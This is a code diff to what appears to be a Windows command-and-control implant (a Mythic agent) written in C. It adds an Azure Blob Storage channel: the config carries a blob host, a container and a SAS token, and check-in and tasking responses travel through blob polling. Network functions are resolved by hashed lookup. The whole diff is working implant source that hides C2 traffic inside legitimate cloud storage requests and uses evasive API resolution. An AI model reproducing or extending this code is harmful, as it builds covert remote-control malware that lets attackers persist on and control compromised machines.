@@ -9,6 +9,9 @@
 #ifdef HTTP_TRANSPORT
 #include "transport_http.h"
 #endif
+#ifdef AZURE_BLOB_TRANSPORT
+#include "transport_azure_blob.h"
+#endif
 // Always include SMB header: link client + frame I/O used by delegate forwarding
 #include "transport_smb.h"
 
@@ -432,7 +435,7 @@ VOID resolve_apis(PINSTANCE inst) {
         inst->Win32.LookupAccountSidA   = (fnLookupAccountSidA)resolve_function(inst->Modules.Advapi32, H_LOOKUPACCOUNTSIDA);
     }
 
-#ifdef HTTP_TRANSPORT
+#if defined(HTTP_TRANSPORT) || defined(AZURE_BLOB_TRANSPORT)
   #ifdef USE_WININET
     STK_WININET(_wininet);
     inst->Modules.Wininet = inst->Win32.LoadLibraryA(_wininet);
@@ -441,6 +444,7 @@ VOID resolve_apis(PINSTANCE inst) {
         inst->Win32.InternetConnectA    = (fnInternetConnectA)resolve_function(inst->Modules.Wininet, H_INTERNETCONNECTA);
         inst->Win32.HttpOpenRequestA    = (fnHttpOpenRequestA)resolve_function(inst->Modules.Wininet, H_HTTPOPENREQUESTA);
         inst->Win32.HttpSendRequestA    = (fnHttpSendRequestA)resolve_function(inst->Modules.Wininet, H_HTTPSENDREQUESTA);
+        inst->Win32.HttpQueryInfoA      = (fnHttpQueryInfoA)resolve_function(inst->Modules.Wininet, H_HTTPQUERYINFOA);
         inst->Win32.InternetReadFile    = (fnInternetReadFile)resolve_function(inst->Modules.Wininet, H_INTERNETREADFILE);
         inst->Win32.InternetCloseHandle = (fnInternetCloseHandle)resolve_function(inst->Modules.Wininet, H_INTERNETCLOSEHANDLE);
         inst->Win32.InternetSetOptionA  = (fnInternetSetOptionA)resolve_function(inst->Modules.Wininet, H_INTERNETSETOPTIONA);
@@ -459,6 +463,7 @@ VOID resolve_apis(PINSTANCE inst) {
         inst->Win32.WinHttpCloseHandle         = (fnWinHttpCloseHandle)resolve_function(inst->Modules.Winhttp, H_WINHTTPCLOSEHANDLE);
         inst->Win32.WinHttpSetOption           = (fnWinHttpSetOption)resolve_function(inst->Modules.Winhttp, H_WINHTTPSETOPTION);
         inst->Win32.WinHttpAddRequestHeaders   = (fnWinHttpAddRequestHeaders)resolve_function(inst->Modules.Winhttp, H_WINHTTPADDREQUESTHEADERS);
+        inst->Win32.WinHttpQueryHeaders        = (fnWinHttpQueryHeaders)resolve_function(inst->Modules.Winhttp, H_WINHTTPQUERYHEADERS);
     }
   #endif
 #endif
@@ -604,6 +609,39 @@ VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len) {
     es_memcpy(inst->Smb.pipename, (PVOID)(buf + pos), copylen);
     inst->Smb.pipename[copylen] = 0;
     pos += slen;
+#endif
+
+#ifdef AZURE_BLOB_TRANSPORT
+    DWORD bslen, bcopy;
+    // Blob endpoint host: {account}.blob.core.windows.net
+    if (pos + 4 > len) return;
+    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
+    pos += 4;
+    if (pos + bslen > len) return;
+    bcopy = bslen < sizeof(inst->Blob.host)-1 ? bslen : sizeof(inst->Blob.host)-1;
+    es_memcpy(inst->Blob.host, (PVOID)(buf + pos), bcopy);
+    inst->Blob.host[bcopy] = 0;
+    pos += bslen;
+
+    // Container name: agent-{uuid12}
+    if (pos + 4 > len) return;
+    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
+    pos += 4;
+    if (pos + bslen > len) return;
+    bcopy = bslen < sizeof(inst->Blob.container)-1 ? bslen : sizeof(inst->Blob.container)-1;
+    es_memcpy(inst->Blob.container, (PVOID)(buf + pos), bcopy);
+    inst->Blob.container[bcopy] = 0;
+    pos += bslen;
+
+    // Container-scoped SAS query string
+    if (pos + 4 > len) return;
+    bslen = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
+    pos += 4;
+    if (pos + bslen > len) return;
+    bcopy = bslen < sizeof(inst->Blob.sas)-1 ? bslen : sizeof(inst->Blob.sas)-1;
+    es_memcpy(inst->Blob.sas, (PVOID)(buf + pos), bcopy);
+    inst->Blob.sas[bcopy] = 0;
+    pos += bslen;
 #endif
 }
 
@@ -1138,7 +1176,12 @@ static BYTE* build_response_msg(PINSTANCE inst, const char* task_id,
 // SMB-only builds have no egress channel; http_post_response lives in the
 // HTTP transport. send_mythic_msg is never called on the SMB path (the SMB
 // loop uses es_smb_process_tasking), so stub it to keep the TU compiling.
-#ifndef HTTP_TRANSPORT
+// Azure Blob builds swap the send call for the ats/sta polling transport;
+// the wire format (base64 of uuid+payload) is identical, only the carrier
+// changes. http.cc compiles out entirely in these builds.
+#ifdef AZURE_BLOB_TRANSPORT
+#define http_post_response blob_post_response
+#elif !defined(HTTP_TRANSPORT)
 static BOOL http_post_response_stub(PINSTANCE inst, BYTE* data, DWORD len,
                                     BYTE** resp, DWORD* rlen) {
     (void)inst; (void)data; (void)len;
@@ -1335,14 +1378,18 @@ VOID agent_main(PINSTANCE inst) {
     TRACE(inst, "agent_main: pre-transport");
 #ifdef HTTP_TRANSPORT
     TRACE(inst, "agent_main: transport=HTTP");
-#else
-    TRACE(inst, "agent_main: transport=NOT_HTTP");
+#endif
+#ifdef AZURE_BLOB_TRANSPORT
+    TRACE(inst, "agent_main: transport=AZURE_BLOB");
+#endif
+#if !defined(HTTP_TRANSPORT) && !defined(AZURE_BLOB_TRANSPORT)
+    TRACE(inst, "agent_main: transport=NOT_EGRESS");
 #endif
 #ifdef SMB_TRANSPORT
     TRACE(inst, "agent_main: transport=SMB");
 #endif
 
-#ifdef HTTP_TRANSPORT
+#if defined(HTTP_TRANSPORT) || defined(AZURE_BLOB_TRANSPORT)
     // Initial checkin
     DWORD checkin_len = 0;
     BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
